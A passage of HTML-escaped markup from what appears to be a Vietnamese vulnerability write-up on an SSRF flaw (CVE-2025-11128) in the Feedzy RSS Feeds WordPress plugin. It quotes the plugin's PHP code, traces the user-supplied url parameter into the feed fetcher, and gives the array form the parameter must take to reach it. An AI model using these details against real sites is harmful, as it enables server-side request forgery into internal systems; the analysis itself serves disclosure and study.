tin&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;H√†m &lt;code&gt;count()&lt;/code&gt; trong &lt;code&gt;feedzy_sanitize_feeds()&lt;/code&gt; y√™u c·∫ßu tham s·ªë ƒë·∫ßu v√†o ph·∫£i thu·ªôc ki·ªÉu &lt;strong&gt;Countable&lt;/strong&gt; ho·∫∑c &lt;strong&gt;array&lt;/strong&gt;. N·∫øu truy·ªÅn v√†o m·ªôt &lt;strong&gt;string&lt;/strong&gt;, PHP s·∫Ω n√©m l·ªói:&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;L·ªói&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;strong&gt;Exception has occurred.&lt;/strong&gt;&#xA;TypeError: count(): Argument #1 ($value) must be of type Countable|array, string given&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;V√¨ v·∫≠y, khi g·ª≠i request ƒë·∫øn endpoint, c·∫ßn truy·ªÅn tham s·ªë &lt;code&gt;url&lt;/code&gt; d∆∞·ªõi d·∫°ng &lt;strong&gt;m·∫£ng&lt;/strong&gt;, v√≠ d·ª•:&#xA;&lt;code&gt;url[0]=&amp;quot;http://example.com&amp;quot;&lt;/code&gt;&lt;/p&gt;&#xA;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;feedzy_rest_route()&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho API tr√™n:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function feedzy_rest_route( $data ) {&#xA;    $feed = $data;&#xA;    if ( isset( $data[&amp;#39;feeds&amp;#39;] ) ) {&#xA;        $feed_category = $this-&amp;gt;feedzy_sanitize_categories( $data[&amp;#39;feeds&amp;#39;] );&#xA;        if ( $feed_category ) {&#xA;            $data[&amp;#39;url&amp;#39;] = $feed_category;&#xA;        }&#xA;    }&#xA;    if ( ! empty( $data[&amp;#39;url&amp;#39;] ) ) {&#xA;        $feed = $data[&amp;#39;url&amp;#39;];&#xA;    } elseif ( ! empty( $data[&amp;#39;category&amp;#39;] ) ) {&#xA;        $feed = $data[&amp;#39;category&amp;#39;];&#xA;    }&#xA;&#xA;    $url = &amp;#39;&amp;#39;;&#xA;    if ( ! $feed instanceof \WP_REST_Request ) {&#xA;        $url = $feed;&#xA;    }&#xA;&#xA;    $meta_args = array(&#xA;        &amp;#39;date_format&amp;#39; =&amp;gt; get_option( &amp;#39;date_format&amp;#39; ),&#xA;        &amp;#39;time_format&amp;#39; =&amp;gt; get_option( &amp;#39;time_format&amp;#39; ),&#xA;    );&#xA;&#xA;    $instance = Feedzy_Rss_Feeds::instance();&#xA;    $admin    = $instance-&amp;gt;get_admin();&#xA;    $feed     = $admin-&amp;gt;fetch_feed( $url, &amp;#39;12_hours&amp;#39;, array( &amp;#39;&amp;#39; ) );&#xA;    $feedy    = array();&#xA;&#xA;    if ( ! $feed-&amp;gt;init() ) {&#xA;        $feedy[&amp;#39;error&amp;#39;] = __( &amp;#39;Invalid Feed URL&amp;#39;, &amp;#39;feedzy-rss-feeds&amp;#39; );&#xA;        header( &amp;#39;Content-Type: application/json; charset=&amp;#39; . get_option( &amp;#39;blog_charset&amp;#39; ) );&#xA;        return $feedy;&#xA;    }&#xA;&#xA;    if ( ( ! $feed-&amp;gt;get_title() ) &amp;amp;&amp;amp; ( ! $feed-&amp;gt;get_title() ) &amp;amp;&amp;amp; ( ! $feed-&amp;gt;get_title() ) ) {&#xA;        $feedy[&amp;#39;channel&amp;#39;] = null;&#xA;    } else {&#xA;        $feedy[&amp;#39;channel&amp;#39;] = array(&#xA;            &amp;#39;title&amp;#39;       =&amp;gt; ( ( $feed-&amp;gt;get_title() ) ? $feed-&amp;gt;get_title() : null ),&#xA;            &amp;#39;description&amp;#39; =&amp;gt; ( ( $feed-&amp;gt;get_description() ) ? $feed-&amp;gt;get_description() : null ),&#xA;            &amp;#39;permalink&amp;#39;   =&amp;gt; ( ( $feed-&amp;gt;get_permalink() ) ? $feed-&amp;gt;get_permalink() : null ),&#xA;        );&#xA;    }&#xA;&#xA;    $feedy[&amp;#39;items&amp;#39;] = array();&#xA;    $items          = $feed-&amp;gt;get_items();&#xA;    $is_multiple    = ! empty( $feed-&amp;gt;multifeed_url ) &amp;amp;&amp;amp; is_array( $feed-&amp;gt;multifeed_url );&#xA;    foreach ( $items as $item ) {&#xA;        $item_attrs = apply_filters( &amp;#39;feedzy_item_filter&amp;#39;, array(), $item );&#xA;&#xA;        array_push(&#xA;            $feedy[&amp;#39;items&amp;#39;],&#xA;            array(&#xA;                &amp;#39;title&amp;#39;       =&amp;gt; ( ( $item-&amp;gt;get_title() ) ? $item-&amp;gt;get_title() : null ),&#xA;                &amp;#39;link&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_permalink() ) ? $item-&amp;gt;get_permalink() : null ),&#xA;                &amp;#39;creator&amp;#39;     =&amp;gt; ( ( $item-&amp;gt;get_author() ) ? $item-&amp;gt;get_author()-&amp;gt;get_name() : null ),&#xA;                &amp;#39;source&amp;#39;      =&amp;gt; $is_multiple &amp;amp;&amp;amp; $item-&amp;gt;get_feed()-&amp;gt;get_title() ? $item-&amp;gt;get_feed()-&amp;gt;get_title() : &amp;#39;&amp;#39;,&#xA;                &amp;#39;pubDate&amp;#39;     =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) : null ),&#xA;                &amp;#39;date&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? date_i18n( $meta_args[&amp;#39;date_format&amp;#39;], $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) ) : null ),&#xA;                &amp;#39;time&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? date_i18n( $meta_args[&amp;#39;time_format&amp;#39;], $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) ) : null ),&#xA;                &amp;#39;description&amp;#39; =&amp;gt; isset( $item_attrs[&amp;#39;item_description&amp;#39;] ) ? $item_attrs[&amp;#39;item_description&amp;#39;] : ( $item-&amp;gt;get_description() ? $item-&amp;gt;get_description() : null ),&#xA;                &amp;#39;thumbnail&amp;#39;   =&amp;gt; $admin-&amp;gt;feedzy_retrieve_image( $item ),&#xA;                &amp;#39;default_img&amp;#39; =&amp;gt; apply_filters( &amp;#39;feedzy_default_image&amp;#39;, &amp;#39;&amp;#39;, $url ),&#xA;                &amp;#39;price&amp;#39;       =&amp;gt; isset( $item_attrs[&amp;#39;item_price&amp;#39;] ) ? $item_attrs[&amp;#39;item_price&amp;#39;] : null,&#xA;                &amp;#39;media&amp;#39;       =&amp;gt; isset( $item_attrs[&amp;#39;item_media&amp;#39;] ) ? $item_attrs[&amp;#39;item_media&amp;#39;] : null,&#xA;                &amp;#39;categories&amp;#39;  =&amp;gt; isset( $item_attrs[&amp;#39;item_categories&amp;#39;] ) ? $item_attrs[&amp;#39;item_categories&amp;#39;] : null,&#xA;            )&#xA;        );&#xA;    }&#xA;&#xA;    header( &amp;#39;Content-Type: application/json; charset=&amp;#39; . get_option( &amp;#39;blog_charset&amp;#39; ) );&#xA;    $output = $feedy;&#xA;    return $output;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Logic c·ªßa h√†m:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Nh·∫≠n v√† x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$feed = $data;&#xA;if ( isset( $data[&amp;#39;feeds&amp;#39;] ) ) {&#xA;    $feed_category = $this-&amp;gt;feedzy_sanitize_categories( $data[&amp;#39;feeds&amp;#39;] );&#xA;    if ( $feed_category ) {&#xA;        $data[&amp;#39;url&amp;#39;] = $feed_category;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;H√†m ki·ªÉm tra n·∫øu request c√≥ ch·ª©a tham s·ªë &lt;code&gt;feeds&lt;/code&gt;, n√≥ s·∫Ω ƒë∆∞·ª£c &lt;strong&gt;l√†m s·∫°ch&lt;/strong&gt; (sanitize) qua &lt;code&gt;feedzy_sanitize_categories()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu h·ª£p l·ªá, k·∫øt qu·∫£ ƒë∆∞·ª£c g√°n l·∫°i cho &lt;code&gt;$data[&#39;url&#39;]&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;∆Øu ti√™n ch·ªçn ngu·ªìn d·ªØ li·ªáu &lt;code&gt;$feed&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! empty( $data[&amp;#39;url&amp;#39;] ) ) {&#xA;    $feed = $data[&amp;#39;url&amp;#39;];&#xA;} elseif ( ! empty( $data[&amp;#39;category&amp;#39;] ) ) {&#xA;    $feed = $data[&amp;#39;category&amp;#39;];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu c√≥ &lt;code&gt;url&lt;/code&gt; ‚Üí d√πng l√†m ngu·ªìn ch√≠nh.&lt;/li&gt;&#xA;&lt;li&gt;N·∫øu kh√¥ng c√≥ &lt;code&gt;url&lt;/code&gt; ‚Üí d√πng &lt;code&gt;category&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;‚Üí ƒê√¢y l√† n∆°i ƒë·∫ßu v√†o ng∆∞·ªùi d√πng (&lt;code&gt;url&lt;/code&gt;) ƒë∆∞·ª£c chuy·ªÉn ti·∫øp sang qu√° tr√¨nh fetch feed.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Chu·∫©n b·ªã bi·∫øn &lt;code&gt;$url&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$url = &amp;#39;&amp;#39;;&#xA;if ( ! $feed instanceof \WP_REST_Request ) {&#xA;    $url = $feed;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu &lt;code&gt;$feed&lt;/code&gt; &lt;strong&gt;kh√¥ng ph·∫£i l√† ƒë·ªëi t∆∞·ª£ng WP_REST_Request&lt;/strong&gt;, n√≥ ƒë∆∞·ª£c g√°n cho &lt;code&gt;$url&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Th·ª±c t·∫ø &lt;code&gt;$feed&lt;/code&gt; th∆∞·ªùng l√† &lt;strong&gt;m·ªôt chu·ªói URL ho·∫∑c m·∫£ng URL&lt;/strong&gt; ƒë∆∞·ª£c l·∫•y t·ª´ request.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;G·ªçi ƒë·∫øn core function x·ª≠ l√Ω&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$instance = Feedzy_Rss_Feeds::instance();&#xA;$admin    = $instance-&amp;gt;get_admin();&#xA;$feed     = $admin-&amp;gt;fetch_feed( $url, &amp;#39;12_hours&amp;#39;, array( &amp;#39;&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;G·ªçi &lt;code&gt;Feedzy_Rss_Feeds::instance()&lt;/code&gt; ƒë·ªÉ l·∫•y instance ch√≠nh c·ªßa plugin.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;D√πng &lt;code&gt;$admin-&amp;gt;fetch_feed()&lt;/code&gt; ƒë·ªÉ &lt;strong&gt;t·∫£i feed t·ª´ URL&lt;/strong&gt; (v·ªõi th·ªùi gian cache 12 gi·ªù).&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;‚ö†Ô∏è ƒê√¢y ch√≠nh l√† n∆°i c√≥ th·ªÉ x·∫£y ra SSRF n·∫øu &lt;code&gt;$url&lt;/code&gt; ƒë·∫øn t·ª´ input kh√¥ng ki·ªÉm so√°t.&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;Ki·ªÉm tra l·ªói t·∫£i RSS&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! $feed-&amp;gt;init() ) {&#xA;    $feedy[&amp;#39;error&amp;#39;] = __( &amp;#39;Invalid Feed URL&amp;#39;, &amp;#39;feedzy-rss-feeds&amp;#39; );&#xA;    return $feedy;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu &lt;code&gt;init()&lt;/code&gt; th·∫•t b·∫°i ‚Üí tr·∫£ v·ªÅ l·ªói JSON &lt;code&gt;&amp;quot;Invalid Feed URL&amp;quot;&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;Tr√≠ch xu·∫•t th√¥ng tin k√™nh (channel)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ( ! $feed-&amp;gt;get_title() ) &amp;amp;&amp;amp; ... ) {&#xA;    $feedy[&amp;#39;channel&amp;#39;] = null;&#xA;} else {&#xA;    $feedy[&amp;#39;channel&amp;#39;] = array(&#xA;        &amp;#39;title&amp;#39; =&amp;gt; $feed-&amp;gt;get_title(),&#xA;        &amp;#39;description&amp;#39; =&amp;gt; $feed-&amp;gt;get_description(),&#xA;        &amp;#39;permalink&amp;#39; =&amp;gt; $feed-&amp;gt;get_permalink(),&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu feed kh√¥ng c√≥ ti√™u ƒë·ªÅ ‚Üí g√°n &lt;code&gt;null&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Ng∆∞·ª£c l·∫°i ‚Üí t·∫°o th√¥ng tin channel chu·∫©n (title, description, link).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;L·∫∑p qua t·ª´ng item trong feed&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;foreach ( $items as $item ) {&#xA;    $item_attrs = apply_filters( &amp;#39;feedzy_item_filter&amp;#39;, array(), $item );&#xA;    array_push(&#xA;        $feedy[&amp;#39;items&amp;#39;],&#xA;        array(&#xA;            &amp;#39;title&amp;#39;       =&amp;gt; ( ( $item-&amp;gt;get_title() ) ? $item-&amp;gt;get_title() : null ),&#xA;            &amp;#39;link&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_permalink() ) ? $item-&amp;gt;get_permalink() : null ),&#xA;            &amp;#39;creator&amp;#39;     =&amp;gt; ( ( $item-&amp;gt;get_author() ) ? $item-&amp;gt;get_author()-&amp;gt;get_name() : null ),&#xA;            &amp;#39;source&amp;#39;      =&amp;gt; $is_multiple &amp;amp;&amp;amp; $item-&amp;gt;get_feed()-&amp;gt;get_title() ? $item-&amp;gt;get_feed()-&amp;gt;get_title() : &amp;#39;&amp;#39;,&#xA;            &amp;#39;pubDate&amp;#39;     =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) : null ),&#xA;            &amp;#39;date&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? date_i18n( $meta_args[&amp;#39;date_format&amp;#39;], $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) ) : null ),&#xA;            &amp;#39;time&amp;#39;        =&amp;gt; ( ( $item-&amp;gt;get_date() ) ? date_i18n( $meta_args[&amp;#39;time_format&amp;#39;], $item-&amp;gt;get_date( &amp;#39;U&amp;#39; ) ) : null ),&#xA;            &amp;#39;description&amp;#39; =&amp;gt; isset( $item_attrs[&amp;#39;item_description&amp;#39;] ) ? $item_attrs[&amp;#39;item_description&amp;#39;] : ( $item-&amp;gt;get_description() ? $item-&amp;gt;get_description() : null ),&#xA;            &amp;#39;thumbnail&amp;#39;   =&amp;gt; $admin-&amp;gt;feedzy_retrieve_image( $item ),&#xA;            &amp;#39;default_img&amp;#39; =&amp;gt; apply_filters( &amp;#39;feedzy_default_image&amp;#39;, &amp;#39;&amp;#39;, $url ),&#xA;            &amp;#39;price&amp;#39;       =&amp;gt; isset( $item_attrs[&amp;#39;item_price&amp;#39;] ) ? $item_attrs[&amp;#39;item_price&amp;#39;] : null,&#xA;            &amp;#39;media&amp;#39;       =&amp;gt; isset( $item_attrs[&amp;#39;item_media&amp;#39;] ) ? $item_attrs[&amp;#39;item_media&amp;#39;] : null,&#xA;            &amp;#39;categories&amp;#39;  =&amp;gt; isset( $item_attrs[&amp;#39;item_categories&amp;#39;] ) ? $item_attrs[&amp;#39;item_categories&amp;#39;] : null,&#xA;        )&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;8&#34;&gt;&#xA;&lt;li&gt;Tr·∫£ k·∫øt qu·∫£ JSON&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;header( &amp;#39;Content-Type: application/json; charset=&amp;#39; . get_option( &amp;#39;blog_charset&amp;#39; ) );&#xA;return $feedy;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;M·ªói b√†i vi·∫øt (item) ƒë∆∞·ª£c l·∫•y ra v√† √°nh x·∫° th√†nh m·∫£ng JSON c√≥: Ti√™u ƒë·ªÅ, li√™n k·∫øt, t√°c gi·∫£, ng√†y, m√¥ t·∫£, ·∫£nh thumbnail, v.v.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition note open&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-pencil-alt&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Ghi ch√∫&lt;i class=&#34;details-icon fa-solid fa-angle-right fa-fw&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;N·ªôi dung ƒë∆∞·ª£c tr·∫£ v·ªÅ ch·ª©a c√°c tr∆∞·ªùng ch·ªâ ƒë·ªãnh =&amp;gt; Cho th·∫•y d·ªØ li·ªáu fetch t·ª´ URL l√† m·ªôt file c√≥ c·∫•u tr√∫c bao g·ªìm c√°c tr∆∞·ªùng ·ªü tr√™n n√™n ta kh√¥ng th·ªÉ ƒë·ªçc m·ªôt file b·∫•t k·ª≥ ƒë∆∞·ª£c.&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&lt;p&gt;Ta ph√¢n t√≠ch &lt;code&gt;fetch_feed()&lt;/code&gt; ƒë·ªÉ xem file n√≥ th·ª±c s·ª± ƒë·ªçc ƒë∆∞·ª£c l√† g√¨:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function fetch_feed( $feed_url, $cache = &amp;#39;12_hours&amp;#39;, $sc = &amp;#39;&amp;#39; ) {&#xA;    // Load SimplePie if not already.&#xA;    do_action( &amp;#39;feedzy_pre_http_setup&amp;#39;, $feed_url );&#xA;    if ( function_exists( &amp;#39;feedzy_amazon_get_locale_hosts&amp;#39; ) ) {&#xA;        $amazon_hosts     = feedzy_amazon_get_locale_hosts();&#xA;        $is_amazon_source = false;&#xA;        if ( is_array( $feed_url ) ) {&#xA;            $url_host         = array_map(&#xA;                function ( $url ) {&#xA;                    return &amp;#39;webservices.&amp;#39; . wp_parse_url( $url, PHP_URL_HOST );&#xA;                },&#xA;                $feed_url&#xA;            );&#xA;            $url_host         = array_diff( $url_host, $amazon_hosts );&#xA;            $is_amazon_source = ! empty( $amazon_hosts ) &amp;amp;&amp;amp; empty( $url_host );&#xA;        } else {&#xA;            $url_host         = &amp;#39;webservices.&amp;#39; . wp_parse_url( $feed_url, PHP_URL_HOST );&#xA;            $is_amazon_source = ! empty( $amazon_hosts ) &amp;amp;&amp;amp; in_array( $url_host, $amazon_hosts, true );&#xA;        }&#xA;        if ( $is_amazon_source ) {&#xA;            $feed = $this-&amp;gt;init_amazon_api(&#xA;                $feed_url,&#xA;                isset( $sc[&amp;#39;refresh&amp;#39;] ) ? $sc[&amp;#39;refresh&amp;#39;] : &amp;#39;12_hours&amp;#39;,&#xA;                array(&#xA;                    &amp;#39;number_of_item&amp;#39; =&amp;gt; isset( $sc[&amp;#39;max&amp;#39;] ) ? $sc[&amp;#39;max&amp;#39;] : 5,&#xA;                    &amp;#39;no-cache&amp;#39;       =&amp;gt; false,&#xA;                )&#xA;            );&#xA;            return $feed;&#xA;        }&#xA;    }&#xA;    // Load SimplePie Instance.&#xA;    $feed = $this-&amp;gt;init_feed( $feed_url, $cache, $sc ); // Not used as log as #41304 is Opened.&#xA;&#xA;    // Report error when is an error loading the feed.&#xA;    if ( is_wp_error( $feed ) ) {&#xA;        // Fallback for different edge cases.&#xA;        if ( is_array( $feed_url ) ) {&#xA;            $feed_url = array_map( &amp;#39;html_entity_decode&amp;#39;, $feed_url );&#xA;        } else {&#xA;            $feed_url = html_entity_decode( $feed_url );&#xA;        }&#xA;&#xA;        $feed_url = $this-&amp;gt;get_valid_source_urls( $feed_url, $cache );&#xA;&#xA;        $feed = $this-&amp;gt;init_feed( $feed_url, $cache, $sc ); // Not used as log as #41304 is Opened.&#xA;&#xA;    }&#xA;&#xA;    do_action( &amp;#39;feedzy_post_http_teardown&amp;#39;, $feed_url );&#xA;&#xA;    return $feed;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu &lt;code&gt;feedzy_amazon_get_locale_hosts&lt;/code&gt; c√≥ t·ªìn t·∫°i th√¨ th·ª±c hi·ªán logic trong &lt;code&gt;if&lt;/code&gt; v√† tr·∫£ v·ªÅ &lt;code&gt;$feed&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( function_exists( &amp;#39;feedzy_amazon_get_locale_hosts&amp;#39; ) ) {&#xA;    ...&#xA;    return $feed&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi t√¨m ki·∫øm h√†m &lt;code&gt;feedzy_amazon_get_locale_hosts&lt;/code&gt; trong to√†n b·ªô th∆∞ m·ª•c c·ªßa plugin, ta nh·∫≠n th·∫•y h√†m n√†y &lt;strong&gt;kh√¥ng ƒë∆∞·ª£c khai b√°o ho·∫∑c ƒë·ªãnh nghƒ©a ·ªü b·∫•t k·ª≥ ƒë√¢u&lt;/strong&gt;.&#xA;Do ƒë√≥, ƒëi·ªÅu ki·ªán ki·ªÉm tra &lt;code&gt;if ( function_exists( &#39;feedzy_amazon_get_locale_hosts&#39; ) )&lt;/code&gt; s·∫Ω lu√¥n &lt;strong&gt;tr·∫£ v·ªÅ &lt;code&gt;false&lt;/code&gt;&lt;/strong&gt;, khi·∫øn lu·ªìng th·ª±c thi &lt;strong&gt;b·ªè qua nh√°nh ƒë√≥&lt;/strong&gt; v√† &lt;strong&gt;ti·∫øp t·ª•c g·ªçi h√†m &lt;code&gt;init_feed()&lt;/code&gt;&lt;/strong&gt; sau ƒë√≥ &lt;strong&gt;check error&lt;/strong&gt; v√† tr·∫£ v·ªÅ feed.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-10-30-cve-2025-11128/function.png&#34; title=&#34;K·∫øt qu·∫£ t√¨m ki·∫øm feedzy_amazon_get_locale_hosts&#34; data-thumbnail=&#34;/posts/2025-10-30-cve-2025-11128/function.png&#34; data-sub-html=&#34;&lt;h2&gt;Function&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£ t√¨m ki·∫øm feedzy_amazon_get_locale_hosts&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-30-cve-2025-11128/function.png&#39; alt=&#34;Function&#34; height=&#34;454&#34; width=&#34;1494&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£ t√¨m ki·∫øm feedzy_amazon_get_locale_hosts&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private function init_feed( $feed_url, $cache, $sc, $allow_https = FEEDZY_ALLOW_HTTPS ) {&#xA;    ...&#xA;    $feed = new Feedzy_Rss_Feeds_Util_SimplePie( $sc );&#xA;    $feed-&amp;gt;set_file_class( &amp;#39;WP_SimplePie_File&amp;#39; );&#xA;    $default_agent = $this-&amp;gt;get_default_user_agent( $feed_url );&#xA;    $feed-&amp;gt;set_useragent( apply_filters( &amp;#39;http_headers_useragent&amp;#39;, $default_agent ) );&#xA;   &#xA;&#xA;    // Do not use force_feed for multiple URLs.&#xA;    $feed-&amp;gt;force_feed( apply_filters( &amp;#39;feedzy_force_feed&amp;#39;, ( is_string( $feed_url ) || ( is_array( $feed_url ) &amp;amp;&amp;amp; 1 === count( $feed_url ) ) ) ) );&#xA;&#xA;    do_action( &amp;#39;feedzy_modify_feed_config&amp;#39;, $feed );&#xA;&#xA;    $cloned_feed = clone $feed;&#xA;&#xA;    // set the url as the last step, because we need to be able to clone this feed without the url being set&#xA;    // so that we can fall back to raw data in case of an error.&#xA;    $feed-&amp;gt;set_feed_url( $feed_url );&#xA;&#xA;    // Allow unsafe html.&#xA;    if ( defined( &amp;#39;FEEDZY_ALLOW_UNSAFE_HTML&amp;#39; ) &amp;amp;&amp;amp; FEEDZY_ALLOW_UNSAFE_HTML ) {&#xA;        $feed-&amp;gt;strip_htmltags( false );&#xA;    }&#xA;&#xA;    if ( isset( $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;] ) ) {&#xA;        // phpcs:ignore WordPressVIPMinimum.Variables.RestrictedVariables.cache_constraints___SERVER__HTTP_USER_AGENT__&#xA;        $set_server_agent = sanitize_text_field( wp_unslash( $_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;] ) . SIMPLEPIE_USERAGENT );&#xA;        $feed-&amp;gt;set_useragent( apply_filters( &amp;#39;http_headers_useragent&amp;#39;, $set_server_agent ) );&#xA;    }&#xA;&#xA;    $feed-&amp;gt;init();&#xA;&#xA;    ...&#xA;    return $feed;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;init_feed()&lt;/code&gt; ch·ªãu tr√°ch nhi·ªám kh·ªüi t·∫°o v√† c·∫•u h√¨nh ƒë·ªëi t∆∞·ª£ng &lt;strong&gt;SimplePie&lt;/strong&gt;, setup m·ªôt s·ªë th√¥ng tin c∆° b·∫£n v√† g·ªçi ƒë·∫øn &lt;code&gt;$feed-&amp;gt;init()&lt;/code&gt; ƒë·ªÉ g·ª≠i request.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public 